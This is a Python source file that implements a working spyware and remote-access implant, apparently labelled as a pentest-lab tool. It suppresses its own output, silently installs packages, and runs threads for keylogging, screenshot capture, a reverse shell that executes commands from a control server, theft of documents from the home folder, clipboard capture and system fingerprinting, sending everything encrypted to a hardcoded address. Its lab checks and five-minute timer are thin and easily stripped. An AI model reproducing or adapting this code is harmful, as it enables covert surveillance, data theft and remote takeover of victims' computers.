import os, sys, ipaddress, subprocess, threading, time, socket, base64, json, io
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')
C2_IP = "192.168.1.100"
C2_PORT = 4444
ENCRYPT_KEY = b"LABKEY1234567890"
if os.environ.get("PENTEST_LAB") != "1": os._exit(1)
try:
    ip = ipaddress.ip_address(C2_IP)
    if not (ip in ipaddress.ip_network("192.168.0.0/16") or ip in ipaddress.ip_network("10.0.0.0/8")): os._exit(1)
except: os._exit(1)
def chk_per():
    try:
        if os.name == "nt":
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            for i in range(winreg.QueryInfoKey(k)[0]):
                if sys.executable.lower() in winreg.EnumValue(k, i)[1].lower(): os._exit(1)
    except: pass
    try:
        if "crontab" in subprocess.run(["crontab","-l"], capture_output=True, text=True).stdout: os._exit(1)
    except: pass
chk_per()
def inst():
    for p in ["pynput","pillow","pycryptodome","mss","requests"]:
        try: __import__(p)
        except ImportError: subprocess.run([sys.executable,"-m","pip","install","--user",p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
inst()
def enc(d):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        return base64.b64encode(AES.new(ENCRYPT_KEY, AES.MODE_ECB).encrypt(pad(d.encode(), 16)))
    except:
        return base64.b64encode(bytes([b ^ ENCRYPT_KEY[i % len(ENCRYPT_KEY)] for i,b in enumerate(d.encode())]))
def exfil(d, pth="/x"):
    try:
        import requests
        requests.post("https://%s:%s%s" % (C2_IP, C2_PORT, pth), data=enc(json.dumps(d)), headers={"LAB-TEST":"LAB-TEST"}, verify=False, timeout=5)
    except:
        try:
            s = socket.socket(); s.connect((C2_IP, C2_PORT)); s.sendall(b"LAB-TEST"+enc(json.dumps(d))); s.close()
        except: pass
def keylog():
    while True:
        try:
            from pynput.keyboard import Listener
            def on(k): exfil({"t":"key","d":str(k)}, "/k")
            with Listener(on_press=on) as l: l.join()
        except: time.sleep(5)
def shot():
    while True:
        try:
            from mss import mss
            from PIL import Image
            with mss() as sct:
                im = sct.grab(sct.monitors[0])
                pil = Image.frombytes("RGB", im.size, im.rgb)
                b = io.BytesIO(); pil.save(b, format="JPEG", quality=20)
                exfil({"t":"scr","d":base64.b64encode(b.getvalue()).decode()}, "/s")
        except:
            try:
                from PIL import ImageGrab
                b = io.BytesIO(); ImageGrab.grab().save(b, format="JPEG", quality=20)
                exfil({"t":"scr","d":base64.b64encode(b.getvalue()).decode()}, "/s")
            except: pass
        time.sleep(15)
def rshell():
    while True:
        try:
            s = socket.socket(); s.connect((C2_IP, C2_PORT)); s.sendall(b"LAB-TEST|RS")
            while True:
                c = s.recv(1024).decode()
                if c=="exit": break
                o = subprocess.run(c, shell=True, capture_output=True)
                s.sendall(b"LAB-TEST"+o.stdout+o.stderr)
            s.close()
        except: time.sleep(10)
def fex():
    while True:
        try:
            for r,_,fs in os.walk(os.path.expanduser("~")):
                for f in fs:
                    if f.endswith((".txt",".pdf",".docx")):
                        try:
                            with open(os.path.join(r,f),"rb") as ff:
                                exfil({"t":"file","n":f,"d":base64.b64encode(ff.read()).decode()[:500]}, "/f")
                        except: pass
                break
        except: pass
        time.sleep(120)
def beat():
    while True:
        exfil({"t":"beat","time":time.time()}, "/b")
        time.sleep(30)
def clip():
    while True:
        try:
            o = subprocess.run("powershell -command \"Get-Clipboard\"", capture_output=True, text=True).stdout
            if o: exfil({"t":"clip","d":o}, "/c")
        except: pass
        time.sleep(25)
def sysinfo():
    try: exfil({"t":"sys","u":os.getlogin(),"h":socket.gethostname()}, "/i")
    except: pass
threading.Timer(300, os._exit, [0]).start()
sysinfo()
for fn in [keylog, shot, rshell, fex, beat, clip]:
    threading.Thread(target=fn, daemon=True).start()
while True: time.sleep(1)